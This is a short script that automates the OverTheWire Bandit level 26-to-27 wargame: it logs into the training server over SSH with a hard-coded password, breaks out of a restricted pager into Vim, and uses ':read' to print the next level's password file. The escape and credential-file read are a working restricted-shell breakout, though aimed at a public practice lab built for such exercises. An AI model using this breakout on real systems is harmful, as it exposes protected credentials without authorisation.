print("[*] Bandit Level 26 -> 27: Using :read command")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connecting...")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[*] Get --More-- and enter Vim")
let initial = ssh_interactive_recv(ssh, 1500)
ssh_interactive_send(ssh, "v")
let vim_start = ssh_interactive_recv(ssh, 1000)

print("[*] Press ENTER past startup")
ssh_interactive_send(ssh, "\r")
let vim_ready = ssh_interactive_recv(ssh, 500)

print("[*] Use :read to insert password file")
ssh_interactive_send(ssh, ":read /etc/bandit_pass/bandit27\r")
let read_result = ssh_interactive_recv(ssh, 1000)

print("\n========== RESULT ==========")
print(read_result)
print("============================\n")

print("[*] Now show all lines with :% to see the content")
ssh_interactive_send(ssh, ":%p\r")
let all_content = ssh_interactive_recv(ssh, 1000)

print("\n========== ALL CONTENT ==========")
print(all_content)
print("=================================\n")

ssh_interactive_close(ssh)
